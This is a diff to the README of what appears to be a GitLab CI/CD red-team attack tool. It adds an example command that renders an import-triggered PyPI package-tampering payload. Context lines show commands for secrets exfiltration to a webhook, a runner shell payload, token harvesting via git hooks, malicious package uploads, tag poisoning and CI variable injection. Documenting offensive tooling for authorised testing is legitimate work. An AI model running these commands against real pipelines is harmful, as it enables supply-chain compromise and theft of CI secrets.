@@ -202,6 +202,11 @@ gogatoz attack -t group/project --commit-ci --payload secrets --webhook https://
 
 # Render payload locally without committing
 gogatoz attack --payload-only --payload ror-shell --tags self-hosted --cmd 'id; uname -a'
+
+# Render a manual, preview-only Python package tamper test
+gogatoz attack --payload-only --payload package-tamper \
+  --tamper-ecosystem pypi --tamper-trigger import \
+  --tamper-entry-file src/acme_fixture/__init__.py
 ```
 
 **Secrets Exfiltration:**
@@ -233,6 +238,7 @@ gogatoz attack -t group/project --commit-ci --payload ror-shell \
 | `--harvest`           | Install git hooks on runner, harvest tokens via callbacks   |
 | `--tamper-release`    | Modify GitLab release metadata and asset links              |
 | `--tamper-package`    | Upload malicious packages to the Generic Packages registry  |
+| `--package-tamper`   | Stage a manual npm/PyPI/RubyGems tamper preview             |
 | `--tamper-tag`        | Poison a git tag by replacing files (Trivy-style)           |
 | `--lotp-inject`       | Living off the Pipeline tool config injection               |
 | `--variable-inject`   | Inject malicious CI variables                               |
